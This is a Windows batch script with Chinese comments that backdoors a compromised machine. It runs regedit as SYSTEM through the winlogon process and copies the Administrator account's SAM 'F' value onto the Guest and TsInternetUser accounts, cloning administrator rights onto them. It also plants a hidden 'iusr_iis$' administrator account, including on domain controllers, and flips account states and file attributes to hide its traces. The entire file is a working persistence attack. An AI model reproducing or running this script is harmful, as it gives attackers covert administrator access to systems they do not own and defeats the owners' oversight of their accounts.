@echo guest.bat ^<zpid^> ^<password^>
@echo __________________________________________________________
@rem 本guest.bat自动克隆guest为administrators组。
@rem 如果存在username表示在终端登陆的环境运行bat.需要手工输入pid值。
@rem 最好先手工修改密码。执行本程序两次。哈哈。 主要是没有掩饰。regedit比较费时间。
@set zpath=%path%
@set zcd=%cd%
@set path=%path%;%windir%;%windir%\system32

:start
@net user guest |find /i "*Domain" &&echo Domain Controller, Dont clone. ADD user! &&goto DOMAIN
@if NOT "%USERNAME%"=="" echo username=[%username%],term_login mode. input PID. &&goto Term

:start1
@pulist.exe |findstr.exe /i "WINLOGON.exe" >a
@setx.exe a -f a -a 0,1 >b
@FOR /F "eol=; tokens=1,2,3* delims=, " %%i in (b) do @set zpid=%%i
@goto AUTO

:Term
@if "%1"=="" goto USAGE
@if NOT "%2"=="" net user guest %2
@if NOT "%2"=="" net user |find /i "tsinternetuser" >nul &&net user tsinternetuser %2
@set zpid=%1


:AUTO
@echo Make admg.reg admt.reg admiis.reg
@psu.exe -p "%windir%\regedit.exe -e admin.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4" -i %zpid% >nul
@psu.exe -p "%windir%\regedit.exe -e name.$$$ HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names" -i %zpid% >nul
@echo Windows Registry Editor Version 5.00 >admg.reg
@echo Windows Registry Editor Version 5.00 >admt.reg
@echo [HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5]>>admg.reg
@echo [HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003e8]>>admt.reg
@type admin.reg >a &echo "Unicode -->>> ansi . find.exe use it ansi." &if exist b del b
@echo "F"=hex:02,00,01,00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,00,\>>b
@setx.exe a -f a -a 4,0 |find "," >>b
@setx.exe a -f a -a 5,0 |find "," >>b
@setx.exe a -f a -a 6,0 |find "," >>b
@type b >>admg.reg
@type b >>admt.reg

:IIS
@set zda=no
@echo iusr_iis exec
@type name.$$$ >name.reg
@copy name.reg name.txt >nul
@FOR /L %%i IN (5,3,30) DO @(setx.exe a -f name.reg -a %%i,0 |find /i "IUSR_IIS$" &&set zda=%%i)
@if "%zda%" =="no" goto PSU
@rep.exe "IUSR_IIS$" name.txt /R /I >nul
@rep.exe "Editor" name.txt /R /I >nul
@find.exe /v /n "" name.txt >n1
@findstr /I "%zda%" n1 >name.iis
@setx a -f name.iis -a 0,1 -d () >zdc
@del n1
@del name.iis
@del name.$$$
@del name.txt
@del a
@del b

@For /F "tokens=1,2* delims= " %%i in (zdc) do @(echo %%i>zdd)
@For /F "tokens=1,2* delims= " %%i in (zdd) do @(set zdd=%%i)
@copy admg.reg admiis.reg >nul
@echo rep.exe "1f5" "%zdd%" admiis.reg /I
@rep.exe "1f5" "%zdd%" admiis.reg /I
@del zdc
@del zdd

:PSU
@attrib -s -r admg.bak >nul
@attrib -s -r admt.bak >nul
@copy admg.bak admg.reg >nul
@copy admt.bak admt.reg >nul
@psu.exe -p "%windir%\regedit.exe -s admg.reg" -i %zpid% >nul
@psu.exe -p "%windir%\regedit.exe -s admt.reg" -i %zpid% >nul

@if NOT "%zda%"=="no" psu.exe -p "%windir%\regedit.exe -s admiis.reg" -i %zpid% >nul
@if NOT "%zda%"=="no" net user iusr_iis$ /active:yes >nul
@if NOT "%zda%"=="no" net user iusr_iis$ /active:no >nul

@copy admg.reg admg.bak >nul
@copy admt.reg admt.bak >nul
@attrib admg.bak +r +s >nul
@attrib admt.bak +r +s >nul

@net user guest /active:yes >nul
@net user guest /active:no >nul
@net user |find /I "tsinternetuser" || goto NEXT
@net user tsinternetuser /active:yes >nul
@net user tsinternetuser /active:no >nul
@if exist admin.reg del admin.reg /f >nul
@if exist admg.reg del admg.reg /f >nul
@if exist admt.reg del admt.reg /f >nul
:Next
@goto end


:DOMAIN
@rem add user iusr_iis$
@if "%2"=="" echo "not input guest of password" &&goto END
@net user |find /i "iusr_iis" >nul ||net user iusr_iis$ %2 /add
@net localgroup administrators |find /i "iusr_iis$" >nul ||net localgroup administrators iusr_iis$ /add
@goto END

:USAGE
@pulist.exe |findstr.exe /i "WINLOGON explorer"
@echo " system.bat zpid <password> "
@echo " Need cur winlogon PID ,Term_mode，Must this Term_login_winlogon_pid. "
@goto end1

:END
@echo ________ALL User IN administrators :
@net localgroup administrators
:END1
@echo psu.exe -p "%windir%\regedit.exe -s admiis.reg" -i %zpid%
@set path=%zpath%
@set zpath=
@set zcd=
@set zda=
@set zdb=
@set zdd=
@set zpid=